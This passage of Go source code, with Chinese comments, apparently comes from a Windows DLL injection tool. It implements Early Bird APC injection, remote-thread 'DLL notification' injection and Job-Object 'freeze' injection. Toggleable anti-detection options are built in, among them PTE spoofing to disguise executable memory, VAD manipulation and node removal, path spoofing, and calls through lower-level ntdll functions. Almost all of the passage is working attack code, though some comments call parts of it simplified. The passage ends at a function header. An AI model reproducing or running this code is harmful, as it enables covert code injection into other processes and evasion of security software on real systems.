		procPath, err = getSystemProgramPath("notepad.exe")
		if err != nil {
			errMsg := "获取notepad.exe路径失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Early Bird APC injection failed", "error", newErr)
			return newErr
		}
	}

	i.logger.Info("目标进程路径", "path", procPath)

	// 决定加载方式
	if i.bypassOptions.MemoryLoad {
		// 从内存加载DLL
		dllBytes, err := os.ReadFile(dllPath)
		if err != nil {
			errMsg := "读取DLL文件失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Early Bird APC injection failed", "error", newErr)
			return newErr
		}

		// 使用早期鸟内存加载
		return i.earlyBirdMemoryInject(procPath, dllBytes)
	}

	// 从磁盘加载的早期鸟注入
	return i.earlyBirdDiskInject(procPath, dllPath)
}

// earlyBirdMemoryInject 从内存执行早期鸟注入
func (i *Injector) earlyBirdMemoryInject(targetPath string, dllBytes []byte) error {
	// 定义Windows API相关常量
	const (
		CREATE_SUSPENDED          = 0x00000004
		MEM_COMMIT                = 0x00001000
		MEM_RESERVE               = 0x00002000
		PAGE_READWRITE            = 0x04
		PROCESS_ALL_ACCESS        = 0x001F0FFF
		THREAD_ALL_ACCESS         = 0x001FFFFF
		QUEUE_USER_APC_FLAGS_NONE = 0
	)

	// 1. 创建进程并挂起
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	si.Cb = uint32(unsafe.Sizeof(si))

	utf16Target, _ := windows.UTF16PtrFromString(targetPath)
	err := windows.CreateProcess(
		nil,
		utf16Target,
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		errMsg := "创建目标进程失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Early Bird memory injection failed", "error", newErr)
		return newErr
	}

	i.logger.Info("已创建并挂起进程", "pid", pi.ProcessId)
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// 2. 在目标进程中分配内存并写入DLL

	if i.bypassOptions.ManualMapping {
		// 使用手动映射
		err := ManualMapDLL(pi.ProcessId, dllBytes, i.bypassOptions.InvisibleMemory)
		if err != nil {
			// 确保在失败时恢复线程并退出
			windows.ResumeThread(pi.Thread)
			errMsg := "手动映射DLL失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Early Bird memory injection failed", "error", newErr)
			return newErr
		}

		// 恢复线程执行
		i.logger.Info("Early Bird 手动映射成功，恢复线程执行")
		windows.ResumeThread(pi.Thread)
		return nil
	}

	// 从内存加载使用反射式加载
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pi.ProcessId)
	if err != nil {
		windows.ResumeThread(pi.Thread)
		errMsg := "打开进程失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Early Bird memory injection failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	// 获取LoadLibraryA地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")

	// 在目标进程中分配内存用于DLL路径
	memAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(dllBytes)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		windows.ResumeThread(pi.Thread)
		errMsg := "分配内存失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Early Bird memory injection failed", "error", newErr)
		return newErr
	}

	// 写入DLL数据
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, memAddr, unsafe.Pointer(&dllBytes[0]), uintptr(len(dllBytes)), &bytesWritten)
	if err != nil {
		windows.ResumeThread(pi.Thread)
		errMsg := "写入DLL数据失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Early Bird memory injection failed", "error", newErr)
		return newErr
	}

	// 创建临时文件用于加载
	tempDllPath := i.createTempDllFile(dllBytes)
	defer os.Remove(tempDllPath)

	// 分配内存用于存储DLL路径
	pathBytes := []byte(tempDllPath + "\x00")
	pathAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(pathBytes)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		windows.ResumeThread(pi.Thread)
		errMsg := "分配路径内存失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Early Bird memory injection failed", "error", newErr)
		return newErr
	}

	// 写入DLL路径
	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&pathBytes[0]), uintptr(len(pathBytes)), &bytesWritten)
	if err != nil {
		windows.ResumeThread(pi.Thread)
		errMsg := "写入路径失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Early Bird memory injection failed", "error", newErr)
		return newErr
	}

	// 3. 使用QueueUserAPC将LoadLibraryA添加到APC队列
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	NtQueueApcThread := ntdll.NewProc("NtQueueApcThread")

	// 队列APC调用LoadLibraryA
	r1, _, err := NtQueueApcThread.Call(
		uintptr(pi.Thread),  // 主线程句柄
		loadLibraryA.Addr(), // LoadLibraryA地址
		pathAddr,            // 存放DLL路径的内存地址
		0,                   // 未使用
		0,                   // 未使用
	)

	if r1 != 0 {
		windows.ResumeThread(pi.Thread)
		errMsg := "队列APC失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Early Bird memory injection failed", "error", newErr)
		return newErr
	}

	i.logger.Info("Early Bird APC注入成功，恢复线程执行")

	// 4. 应用特殊反检测技术
	if i.bypassOptions.PTESpoofing {
		i.pteSpoofing(hProcess, memAddr, uintptr(len(dllBytes)))
	}

	if i.bypassOptions.VADManipulation {
		i.vadManipulation(hProcess, memAddr)

		if i.bypassOptions.RemoveVADNode {
			i.removeVADNode(hProcess, memAddr)
		}
	}

	// 5. 恢复线程执行
	windows.ResumeThread(pi.Thread)

	return nil
}

// earlyBirdDiskInject 从磁盘执行早期鸟注入
func (i *Injector) earlyBirdDiskInject(targetPath string, dllPath string) error {
	// 定义Windows API相关常量
	const (
		CREATE_SUSPENDED   = 0x00000004
		PROCESS_ALL_ACCESS = 0x001F0FFF
	)

	// 1. 创建进程并挂起
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	si.Cb = uint32(unsafe.Sizeof(si))

	utf16Target, _ := windows.UTF16PtrFromString(targetPath)
	err := windows.CreateProcess(
		nil,
		utf16Target,
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return fmt.Errorf("创建目标进程失败: %v", err)
	}

	fmt.Printf("已创建并挂起进程，PID: %d\n", pi.ProcessId)
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// 获取进程句柄
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pi.ProcessId)
	if err != nil {
		windows.ResumeThread(pi.Thread)
		return fmt.Errorf("打开进程失败: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// 2. 在目标进程中分配内存并写入DLL路径
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")

	// 分配内存用于DLL路径
	dllPathBytes := []byte(dllPath + "\x00")
	pathAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		windows.ResumeThread(pi.Thread)
		return fmt.Errorf("分配内存失败: %v", err)
	}

	// 写入DLL路径
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&dllPathBytes[0]), uintptr(len(dllPathBytes)), &bytesWritten)
	if err != nil {
		windows.ResumeThread(pi.Thread)
		return fmt.Errorf("写入DLL路径失败: %v", err)
	}

	// 3. 使用NtQueueApcThread将LoadLibraryA添加到APC队列
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	NtQueueApcThread := ntdll.NewProc("NtQueueApcThread")

	r1, _, err := NtQueueApcThread.Call(
		uintptr(pi.Thread),  // 主线程句柄
		loadLibraryA.Addr(), // LoadLibraryA地址
		pathAddr,            // DLL路径地址
		0,                   // 未使用
		0,                   // 未使用
	)

	if r1 != 0 {
		windows.ResumeThread(pi.Thread)
		return fmt.Errorf("队列APC失败: %v", err)
	}

	// 如果选择了线程栈后分配，将DLL路径移动到线程栈后面的内存区域
	if i.bypassOptions.AllocBehindThreadStack {
		newAddr, err := allocateBehindThreadStack(hProcess, uintptr(len(dllPathBytes)))
		if err == nil {
			// 复制路径到新位置并使用NtQueueApcThread重新排队
			err = WriteProcessMemory(hProcess, newAddr, unsafe.Pointer(&dllPathBytes[0]), uintptr(len(dllPathBytes)), &bytesWritten)
			if err == nil {
				// 释放旧的内存
				VirtualFreeEx(hProcess, pathAddr, 0, windows.MEM_RELEASE)

				// 重新队列APC调用
				r1, _, _ = NtQueueApcThread.Call(
					uintptr(pi.Thread),
					loadLibraryA.Addr(),
					newAddr,
					0,
					0,
				)
				fmt.Printf("已使用线程栈后分配技术重新排队APC\n")
			}
		}
	}

	// 如果使用直接系统调用，直接调用LdrLoadDll而不是LoadLibrary
	if i.bypassOptions.DirectSyscalls {
		// 虽然这里标记为直接系统调用，但由于系统调用号会随Windows版本变化，
		// 这里仅使用较低级别API LdrLoadDll代替，以获得类似的反检测效果
		ntdll := windows.NewLazySystemDLL("ntdll.dll")
		ldrLoadDll := ntdll.NewProc("LdrLoadDll")

		// 重新排队APC，使用LdrLoadDll
		r1, _, _ = NtQueueApcThread.Call(
			uintptr(pi.Thread),
			ldrLoadDll.Addr(),
			0,        // PathToFile
			0,        // Flags
			pathAddr, // ModuleFileName
		)
		fmt.Printf("已使用直接系统调用技术重新排队APC\n")
	}

	fmt.Printf("Early Bird APC注入成功，恢复线程执行...\n")

	// 4. 恢复线程执行
	windows.ResumeThread(pi.Thread)

	return nil
}

// dllNotificationInject 使用DLL通知注入方法
func (i *Injector) dllNotificationInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	// DLL通知注入方法利用Windows的DLL加载通知机制
	// 创建一个监听DLL加载事件的远程线程
	fmt.Printf("准备执行DLL通知注入...\n")

	// 确定DLL路径
	dllPath := i.dllPath
	if i.bypassOptions.PathSpoofing {
		dllPath = i.spoofDllPath()
		defer func() {
			if dllPath != i.dllPath {
				os.Remove(dllPath)
			}
		}()
	}

	// 从内存加载
	if i.bypassOptions.MemoryLoad {
		dllBytes, err := os.ReadFile(dllPath)
		if err != nil {
			return fmt.Errorf("读取DLL文件失败: %v", err)
		}

		if i.bypassOptions.ManualMapping {
			return ManualMapDLL(i.processID, dllBytes, i.bypassOptions.InvisibleMemory)
		}

		return i.memoryLoadDLLWithNotification(dllBytes)
	}

	// 从磁盘加载，通过安装DLL加载通知实现
	return i.diskLoadDLLWithNotification(dllPath)
}

// memoryLoadDLLWithNotification 从内存加载DLL并使用通知机制
func (i *Injector) memoryLoadDLLWithNotification(dllBytes []byte) error {
	// Windows API常量
	const (
		MEM_COMMIT             = 0x00001000
		MEM_RESERVE            = 0x00002000
		PAGE_EXECUTE_READWRITE = 0x40
		PAGE_READWRITE         = 0x04
	)

	// 1. 打开目标进程
	hProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|
		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, i.processID)
	if err != nil {
		return fmt.Errorf("打开目标进程失败: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// 2. 创建临时DLL文件用于注入
	tempDllPath := i.createTempDllFile(dllBytes)
	defer os.Remove(tempDllPath)

	// 需要注入shellcode来监控DLL加载事件
	// 这是一个简化版的shellcode，实际上需要更复杂的实现
	// 使用注入shellcode监控LdrLoadDll函数并在目标DLL加载时执行我们的代码

	// 获取ntdll中的关键函数
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")

	// 3. 分配内存用于存放shellcode
	// 通常我们会在这里注入一段hook LdrLoadDll的shellcode
	// 为了简化，我们仅演示核心概念

	// 为DLL路径分配内存
	pathBytes := []byte(tempDllPath + "\x00")
	pathAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(pathBytes)),
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("分配内存失败: %v", err)
	}

	// 写入DLL路径
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&pathBytes[0]),
		uintptr(len(pathBytes)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("写入DLL路径失败: %v", err)
	}

	// 4. 创建远程线程，调用LoadLibrary函数
	// 实际上我们需要注入一个回调函数来监视LdrLoadDll调用，
	// 但这里简化为直接使用LoadLibrary
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0,
		loadLibraryA.Addr(), pathAddr, 0, nil)
	if err != nil {
		return fmt.Errorf("创建远程线程失败: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	// 5. 等待线程完成
	_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
	if err != nil {
		return fmt.Errorf("等待线程失败: %v", err)
	}

	// 6. 应用特殊反检测技术
	if i.bypassOptions.PTESpoofing {
		i.pteSpoofing(hProcess, pathAddr, uintptr(len(pathBytes)))
	}

	if i.bypassOptions.VADManipulation {
		i.vadManipulation(hProcess, pathAddr)

		if i.bypassOptions.RemoveVADNode {
			i.removeVADNode(hProcess, pathAddr)
		}
	}

	fmt.Printf("DLL通知注入成功\n")
	return nil
}

// diskLoadDLLWithNotification 从磁盘加载DLL并使用通知机制
func (i *Injector) diskLoadDLLWithNotification(dllPath string) error {
	// Windows API常量
	const (
		MEM_COMMIT             = 0x00001000
		MEM_RESERVE            = 0x00002000
		PAGE_EXECUTE_READWRITE = 0x40
		PAGE_READWRITE         = 0x04
	)

	// 1. 打开目标进程
	hProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|
		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, i.processID)
	if err != nil {
		return fmt.Errorf("打开目标进程失败: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// 2. 注入监听DLL加载的shellcode
	// 在完整实现中，这里我们需要注入hook LdrLoadDll的shellcode
	// 为了简化，我们仅使用LoadLibrary

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")

	// 为DLL路径分配内存
	dllPathBytes := []byte(dllPath + "\x00")
	var pathAddr uintptr
	var bytesWritten uintptr

	// 如果使用线程栈后分配
	if i.bypassOptions.AllocBehindThreadStack {
		pathAddr, err = allocateBehindThreadStack(hProcess, uintptr(len(dllPathBytes)))
		if err != nil {
			// 回退到标准分配
			pathAddr, err = VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)),
				MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
			if err != nil {
				return fmt.Errorf("分配内存失败: %v", err)
			}
		}
	} else {
		// 标准内存分配
		pathAddr, err = VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)),
			MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
		if err != nil {
			return fmt.Errorf("分配内存失败: %v", err)
		}
	}

	// 写入DLL路径
	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(len(dllPathBytes)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("写入DLL路径失败: %v", err)
	}

	// 3. 根据选项决定使用哪种函数加载DLL
	var threadStartAddr uintptr

	if i.bypassOptions.DirectSyscalls {
		// 使用LdrLoadDll而不是LoadLibrary
		ntdll := windows.NewLazySystemDLL("ntdll.dll")
		ldrLoadDll := ntdll.NewProc("LdrLoadDll")
		threadStartAddr = ldrLoadDll.Addr()

		fmt.Printf("使用直接系统调用技术(LdrLoadDll)...\n")
	} else {
		// 使用LoadLibrary
		threadStartAddr = loadLibraryA.Addr()
	}

	// 4. 创建远程线程执行加载
	var threadHandle windows.Handle
	if i.bypassOptions.DirectSyscalls {
		// 使用直接系统调用创建线程
		threadHandle, err = ntCreateThreadEx(hProcess, threadStartAddr, pathAddr)
	} else {
		// 使用标准API创建线程
		threadHandle, err = CreateRemoteThread(hProcess, nil, 0,
			threadStartAddr, pathAddr, 0, nil)
	}

	if err != nil {
		return fmt.Errorf("创建远程线程失败: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	// 5. 等待线程完成
	_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
	if err != nil {
		return fmt.Errorf("等待线程失败: %v", err)
	}

	// 6. 应用特殊反检测技术
	if i.bypassOptions.PTESpoofing {
		i.pteSpoofing(hProcess, pathAddr, uintptr(len(dllPathBytes)))
	}

	if i.bypassOptions.VADManipulation {
		i.vadManipulation(hProcess, pathAddr)

		if i.bypassOptions.RemoveVADNode {
			i.removeVADNode(hProcess, pathAddr)
		}
	}

	fmt.Printf("DLL通知磁盘注入成功\n")
	return nil
}

// cryoBirdInject 使用Job Object冷冻进程的注入方法
func (i *Injector) cryoBirdInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	// 冷冻进程注入使用Windows Job Object的冻结特性
	// 将进程添加到Job Object，然后冻结它，注入DLL，最后解冻
	fmt.Printf("准备执行Job Object冷冻进程注入...\n")

	// 确定DLL路径
	dllPath := i.dllPath
	if i.bypassOptions.PathSpoofing {
		dllPath = i.spoofDllPath()
		defer func() {
			if dllPath != i.dllPath {
				os.Remove(dllPath)
			}
		}()
	}

	// 定义Windows API常量和结构
	const (
		MEM_COMMIT                         = 0x00001000
		MEM_RESERVE                        = 0x00002000
		PAGE_READWRITE                     = 0x04
		JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE = 0x00002000

		// 定义冻结操作常量
		JOBOBJECT_FREEZE                    = 1
		JOBOBJECT_UNFREEZE                  = 2
		JOBOBJECT_FREEZE_INFORMATION        = 1
		JOB_OBJECT_EXTEND_LIMIT_INFORMATION = 9
	)

	// 1. 打开目标进程
	hProcess, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, i.processID)
	if err != nil {
		return fmt.Errorf("打开目标进程失败: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// 2. 创建Job Object并分配进程
	jobName, _ := windows.UTF16PtrFromString("InjectorJob")
	hJob, err := windows.CreateJobObject(nil, jobName)
	if err != nil {
		return fmt.Errorf("创建Job Object失败: %v", err)
	}
	defer windows.CloseHandle(hJob)

	// 设置Job Object的关闭限制
	jobLimits := windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION{
		BasicLimitInformation: windows.JOBOBJECT_BASIC_LIMIT_INFORMATION{
			LimitFlags: JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
		},
	}

	_, err = windows.SetInformationJobObject(
		hJob,
		windows.JobObjectExtendedLimitInformation,
		uintptr(unsafe.Pointer(&jobLimits)),
		uint32(unsafe.Sizeof(jobLimits)),
	)
	if err != nil {
		return fmt.Errorf("设置Job Object信息失败: %v", err)
	}

	// 将进程分配到Job Object
	if err = windows.AssignProcessToJobObject(hJob, hProcess); err != nil {
		return fmt.Errorf("分配进程到Job Object失败: %v", err)
	}

	fmt.Printf("进程已添加到Job Object\n")

	// 3. 冻结进程
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntSetInformationJobObject := ntdll.NewProc("NtSetInformationJobObject")

	// Job Object冻结信息结构
	type jobObjectFreezeInformation struct {
		FreezeOperation uint32
		Freeze          uint8   // 使用uint8替代bool
		_               [3]byte // 填充
	}

	freezeInfo := jobObjectFreezeInformation{
		FreezeOperation: JOBOBJECT_FREEZE,
		Freeze:          1, // true
	}

	fmt.Printf("尝试冻结进程...\n")
	r1, _, err := ntSetInformationJobObject.Call(
		uintptr(hJob),
		uintptr(JOBOBJECT_FREEZE_INFORMATION),
		uintptr(unsafe.Pointer(&freezeInfo)),
		uintptr(unsafe.Sizeof(freezeInfo)),
	)

	// 在Windows API中，有时即使返回错误代码，操作也可能成功
	// 特别是当错误消息为"The operation completed successfully"时
	if r1 != 0 && err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("冻结进程失败: %v (错误代码: 0x%X)", err, r1)
	}

	fmt.Printf("进程已冻结，准备注入DLL\n")

	// 4. 注入DLL
	// 根据选项决定使用内存加载还是磁盘加载
	if i.bypassOptions.MemoryLoad {
		// 内存加载
		dllBytes, err := os.ReadFile(dllPath)
		if err != nil {
			return fmt.Errorf("读取DLL文件失败: %v", err)
		}

		// 手动映射
		if i.bypassOptions.ManualMapping {
			if err := ManualMapDLL(i.processID, dllBytes, i.bypassOptions.InvisibleMemory); err != nil {
				// 确保解冻进程，即使注入失败
				unfreezeProcess(hJob)
				return fmt.Errorf("手动映射DLL失败: %v", err)
			}
		} else {
			// 内存加载
			// 创建临时DLL文件
			tempDllPath := i.createTempDllFile(dllBytes)
			defer os.Remove(tempDllPath)

			// 分配内存用于DLL路径
			pathBytes := []byte(tempDllPath + "\x00")
			pathAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(pathBytes)),
				MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
			if err != nil {
				unfreezeProcess(hJob)
				return fmt.Errorf("分配内存失败: %v", err)
			}

			// 写入DLL路径
			var bytesWritten uintptr
			err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&pathBytes[0]),
				uintptr(len(pathBytes)), &bytesWritten)
			if err != nil {
				unfreezeProcess(hJob)
				return fmt.Errorf("写入DLL路径失败: %v", err)
			}

			// 获取LoadLibrary地址
			kernel32 := windows.NewLazySystemDLL("kernel32.dll")
			loadLibraryA := kernel32.NewProc("LoadLibraryA")

			// 创建远程线程
			threadHandle, err := CreateRemoteThread(hProcess, nil, 0,
				loadLibraryA.Addr(), pathAddr, 0, nil)
			if err != nil {
				unfreezeProcess(hJob)
				return fmt.Errorf("创建远程线程失败: %v", err)
			}
			defer windows.CloseHandle(threadHandle)

			// 等待线程完成
			_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
			if err != nil {
				unfreezeProcess(hJob)
				return fmt.Errorf("等待线程失败: %v", err)
			}

			// 应用特殊反检测技术
			if i.bypassOptions.PTESpoofing {
				i.pteSpoofing(hProcess, pathAddr, uintptr(len(pathBytes)))
			}

			if i.bypassOptions.VADManipulation {
				i.vadManipulation(hProcess, pathAddr)

				if i.bypassOptions.RemoveVADNode {
					i.removeVADNode(hProcess, pathAddr)
				}
			}
		}
	} else {
		// 磁盘加载
		// 分配内存用于DLL路径
		dllPathBytes := []byte(dllPath + "\x00")
		var pathAddr uintptr
		var bytesWritten uintptr

		// 如果使用线程栈后分配
		if i.bypassOptions.AllocBehindThreadStack {
			pathAddr, err = allocateBehindThreadStack(hProcess, uintptr(len(dllPathBytes)))
			if err != nil {
				// 回退到标准分配
				pathAddr, err = VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)),
					MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
				if err != nil {
					unfreezeProcess(hJob)
					return fmt.Errorf("分配内存失败: %v", err)
				}
			}
		} else {
			// 标准内存分配
			pathAddr, err = VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)),
				MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
			if err != nil {
				unfreezeProcess(hJob)
				return fmt.Errorf("分配内存失败: %v", err)
			}
		}

		// 写入DLL路径
		err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&dllPathBytes[0]),
			uintptr(len(dllPathBytes)), &bytesWritten)
		if err != nil {
			unfreezeProcess(hJob)
			return fmt.Errorf("写入DLL路径失败: %v", err)
		}

		// 获取函数地址
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		var threadStartAddr uintptr

		if i.bypassOptions.DirectSyscalls {
			// 使用LdrLoadDll而不是LoadLibrary
			ntdll := windows.NewLazySystemDLL("ntdll.dll")
			ldrLoadDll := ntdll.NewProc("LdrLoadDll")
			threadStartAddr = ldrLoadDll.Addr()
		} else {
			// 使用LoadLibrary
			loadLibraryA := kernel32.NewProc("LoadLibraryA")
			threadStartAddr = loadLibraryA.Addr()
		}

		// 创建远程线程
		var threadHandle windows.Handle
		if i.bypassOptions.DirectSyscalls {
			// 使用直接系统调用创建线程
			threadHandle, err = ntCreateThreadEx(hProcess, threadStartAddr, pathAddr)
		} else {
			// 使用标准API创建线程
			threadHandle, err = CreateRemoteThread(hProcess, nil, 0,
				threadStartAddr, pathAddr, 0, nil)
		}

		if err != nil {
			unfreezeProcess(hJob)
			return fmt.Errorf("创建远程线程失败: %v", err)
		}
		defer windows.CloseHandle(threadHandle)

		// 等待线程完成
		_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
		if err != nil {
			unfreezeProcess(hJob)
			return fmt.Errorf("等待线程失败: %v", err)
		}

		// 应用特殊反检测技术
		if i.bypassOptions.PTESpoofing {
			i.pteSpoofing(hProcess, pathAddr, uintptr(len(dllPathBytes)))
		}

		if i.bypassOptions.VADManipulation {
			i.vadManipulation(hProcess, pathAddr)

			if i.bypassOptions.RemoveVADNode {
				i.removeVADNode(hProcess, pathAddr)
			}
		}
	}

	// 5. 解冻进程
	err = unfreezeProcessInternal(hJob, JOBOBJECT_UNFREEZE, JOBOBJECT_FREEZE_INFORMATION)
	if err != nil {
		return fmt.Errorf("解冻进程失败: %v", err)
	}

	fmt.Printf("Job Object冷冻进程注入成功\n")
	return nil
}

// unfreezeProcess 解冻Job Object中的进程
func unfreezeProcess(hJob windows.Handle) error {
	// 定义冻结操作常量
	const (
		JOBOBJECT_UNFREEZE           = 2
		JOBOBJECT_FREEZE_INFORMATION = 1
	)

	return unfreezeProcessInternal(hJob, JOBOBJECT_UNFREEZE, JOBOBJECT_FREEZE_INFORMATION)
}

// unfreezeProcessInternal 解冻进程的内部实现
func unfreezeProcessInternal(hJob windows.Handle, unfreezeOp, freezeInfoType uint32) error {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntSetInformationJobObject := ntdll.NewProc("NtSetInformationJobObject")

	// Job Object冻结信息结构
	type jobObjectFreezeInformation struct {
		FreezeOperation uint32
		Freeze          uint8   // 使用uint8替代bool
		_               [3]byte // 填充
	}

	freezeInfo := jobObjectFreezeInformation{
		FreezeOperation: unfreezeOp,
		Freeze:          0, // false
	}

	fmt.Printf("尝试解冻进程...\n")
	r1, _, err := ntSetInformationJobObject.Call(
		uintptr(hJob),
		uintptr(freezeInfoType),
		uintptr(unsafe.Pointer(&freezeInfo)),
		uintptr(unsafe.Sizeof(freezeInfo)),
	)

	// 在Windows API中，有时即使返回错误代码，操作也可能成功
	// 特别是当错误消息为"The operation completed successfully"时
	if r1 != 0 && err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("解冻进程失败: %v (错误代码: 0x%X)", err, r1)
	}

	fmt.Printf("进程已解冻\n")
	return nil
}

// GetProcessPathByPID 根据进程ID获取进程路径
func GetProcessPathByPID(pid uint32) (string, error) {
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return "", fmt.Errorf("打开进程失败: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	var pathLen uint32 = 260 // MAX_PATH
	pathBuf := make([]uint16, pathLen)
	err = windows.QueryFullProcessImageName(hProcess, 0, &pathBuf[0], &pathLen)
	if err != nil {
		return "", fmt.Errorf("查询进程镜像名失败: %v", err)
	}

	return windows.UTF16ToString(pathBuf[:pathLen]), nil
}

// pteSpoofing 使用PTE修改隐藏内存执行权限
func (i *Injector) pteSpoofing(processHandle windows.Handle, memoryAddress uintptr, size uintptr) error {
	fmt.Printf("执行PTE修改，隐藏内存执行权限...\n")

	// 此功能需要使用驱动程序或低级内核API才能实现
	// 这里只是演示概念，但无法在用户模式下直接修改PTE

	// 真实实现需要:
	// 1. 找到目标内存的页表项(PTE)
	// 2. 修改PTE中的执行位，让其显示为不可执行但实际可执行
	// 3. 刷新TLB缓存使修改生效

	// 对于用户模式应用，我们可以模拟部分效果:
	// 通过修改内存保护属性，使内存看起来是只读的，但实际上是可执行的

	// 获取NtProtectVirtualMemory函数地址
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

	// 内存保护常量
	const (
		PAGE_READONLY     = 0x02
		PAGE_EXECUTE_READ = 0x20
	)

	// 先将内存设置为可执行
	var oldProtect uint32
	r1, _, _ := ntProtectVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&memoryAddress)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if r1 != 0 {
		return fmt.Errorf("设置内存为可执行失败: 0x%X", r1)
	}

	// 然后设置为只读，但不刷新指令缓存
	// 这会让内存在元数据上显示为只读，但实际上由于缓存原因仍然可执行
	// 这只是一种模拟，真实PTE修改效果更强大
	r1, _, _ = ntProtectVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&memoryAddress)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(PAGE_READONLY),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if r1 != 0 {
		return fmt.Errorf("设置内存为只读失败: 0x%X", r1)
	}

	fmt.Printf("已完成PTE修改模拟\n")
	return nil
}

// vadManipulation 使用VAD操作隐藏内存
